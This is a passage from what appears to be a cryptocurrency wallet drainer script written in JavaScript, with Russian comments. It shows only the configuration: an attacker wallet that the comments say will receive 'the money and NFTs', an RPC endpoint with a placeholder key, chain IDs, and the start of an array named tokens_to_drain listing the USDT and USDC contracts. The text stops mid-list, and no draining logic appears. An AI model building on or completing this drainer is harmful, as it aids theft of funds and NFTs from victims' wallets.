/ --- КОНФИГУРАЦИЯ ---
const your_wallet_address = "0x0e7F3426C8bBE2ceA15EF02d45E0F4a7CB279dC1"; // Адрес, куда полетят деньги и NFT
const rpc_url = "https://mainnet.infura.io/v3/ТВОЙ_INFURA_ID"; // RPC для Ethereum. Можешь заменить на BSC, Polygon и т.д.
const chain_id = 1; // 1 для Ethereum, 56 для BSC, 137 для Polygon

// Список адресов популярных ERC-20 токенов для проверки
const tokens_to_drain = [
    "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
    "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",// USDC